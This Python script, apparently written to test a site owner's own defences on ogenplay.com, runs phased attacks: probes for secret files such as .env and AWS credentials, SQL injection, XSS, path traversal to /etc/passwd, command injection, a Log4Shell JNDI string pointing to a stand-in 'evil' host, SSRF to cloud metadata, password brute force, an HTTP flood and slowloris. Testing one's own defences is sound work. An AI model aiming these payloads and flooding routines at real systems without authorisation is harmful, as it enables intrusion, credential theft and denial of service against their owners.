#!/usr/bin/env python3
# Controlled attack simulation against OUR OWN site (ogenplay.com) from an external server. Low volume, bounded.
# usage: attack-sim.py <phase>   phases: normal scan inject brute flood slow all
import http.client, ssl, sys, threading, time, socket, collections, json

TARGET = "ogenplay.com"; HOST = "ogenplay.com"   # by name (SNI) - nginx drops handshakes for bare-IP/unknown names
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"

def req(method, path, body=None, ua=UA_BROWSER, headers=None, timeout=12):
    t0 = time.time()
    try:
        c = http.client.HTTPSConnection(TARGET, 443, context=CTX, timeout=timeout)
        h = {"Host": HOST, "User-Agent": ua}
        if headers: h.update(headers)
        c.request(method, path, body=body, headers=h)
        r = c.getresponse(); r.read(); st = r.status; c.close()
    except Exception as ex:
        st = "ERR:" + type(ex).__name__
    return st, (time.time() - t0) * 1000

def show(title, results):
    cnt = collections.Counter(s for s, _ in results)
    lat = sorted(ms for s, ms in results if isinstance(s, int))
    p50 = lat[len(lat) // 2] if lat else 0
    print(f"{title:<34} codes={dict(cnt)} p50={p50:.0f}ms")

def phase_normal():
    res = [req("GET", p) for p in ["/", "/forum", "/users", "/about", "/api/apps/search?q=waze"]]
    show("normal browsing (control)", res)

def phase_scan():
    paths = ["/.env", "/wp-login.php", "/phpmyadmin/index.php", "/.git/config", "/xmlrpc.php", "/.aws/credentials", "/admin/config.php",
             "/cgi-bin/test.cgi", "/actuator/env", "/backup.sql", "/vendor/phpunit/src/Util/PHP/eval-stdin.php", "/.svn/wc.db"]
    res = [req("GET", p) for p in paths]
    show("scanner paths (expect 444=ERR)", res)

def phase_inject():
    probes = {
        "sqli union": "/api/apps/search?q=1%20union%20select%20password%20from%20users",
        "sqli blind": "/api/apps/search?q=a'%20or%20'1'='1",
        "xss script": "/forum?x=%3Cscript%3Ealert(1)%3C/script%3E",
        "xss event": "/forum?x=%22%20onerror%3Dalert(1)%20x%3D%22",
        "lfi": "/api/cdn/..%2f..%2f..%2fetc/passwd",
        "rce cmdi": "/api/apps/search?q=a%3Bcat%20/etc/passwd",
        "log4shell": "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D",
        "ssrf (log only)": "/api/apps/search?q=http://169.254.169.254/latest/meta-data/",
    }
    res = [req("GET", p) for p in probes.values()]
    show("injection probes (expect 403)", res)
    show("  ssrf probe is log-only (200)", [res[-1]])
    res2 = [req("GET", "/", headers={"x-middleware-subrequest": "middleware"})]
    show("x-middleware-subrequest (400)", res2)
    res3 = [req("GET", "/", ua="sqlmap/1.7.2#stable")]
    show("attack-tool user-agent (ERR)", res3)

def phase_brute():
    body = json.dumps({"email": "nobody@example.com", "password": "wrong-password-123"})
    res = [req("POST", "/api/sb/auth/v1/token?grant_type=password", body=body, headers={"Content-Type": "application/json", "apikey": "x"}) for _ in range(24)]
    show("password brute force x24", res)
    refresh = [req("POST", "/api/sb/auth/v1/token?grant_type=refresh_token", body=json.dumps({"refresh_token": "x"}), headers={"Content-Type": "application/json", "apikey": "x"}) for _ in range(5)]
    show("  refresh_token x5 (never limited)", refresh)

def phase_flood(total=300, conc=12):
    out = []; lock = threading.Lock(); n = [0]
    def worker():
        while True:
            with lock:
                if n[0] >= total: return
                n[0] += 1
            r = req("GET", "/api/apps/search?q=waze", timeout=15)
            with lock: out.append(r)
    t0 = time.time(); ts = [threading.Thread(target=worker) for _ in range(conc)]
    [t.start() for t in ts]; [t.join() for t in ts]
    dur = time.time() - t0
    show(f"HTTP flood {total} req/{conc} threads ({total/dur:.0f} rps)", out)

def phase_slow(conns=60, hold=14):
    socks = []
    for _ in range(conns):
        try:
            s = socket.create_connection((TARGET, 443), timeout=8); s = CTX.wrap_socket(s, server_hostname=HOST)
            s.send(b"GET / HTTP/1.1\r\nHost: ogenplay.com\r\nX-a: "); socks.append(s)
        except Exception:
            pass
    print(f"slowloris: opened {len(socks)} half-open connections, holding {hold}s ...")
    time.sleep(hold)
    closed = 0
    for s in socks:
        try:
            s.settimeout(1); d = s.recv(10)
            if d == b"" or d.startswith(b"HTTP/1.1 408") or d.startswith(b"HTTP/1.1 400"): closed += 1
        except socket.timeout: pass
        except Exception: closed += 1
        finally:
            try: s.close()
            except Exception: pass
    print(f"slowloris: server dropped {closed}/{len(socks)} slow connections after {hold}s (limit: 10s header timeout)")

if __name__ == "__main__":
    ph = sys.argv[1] if len(sys.argv) > 1 else "all"
    order = ["normal", "scan", "inject", "brute", "flood", "slow"] if ph == "all" else [ph]
    for p in order: globals()["phase_" + p]()
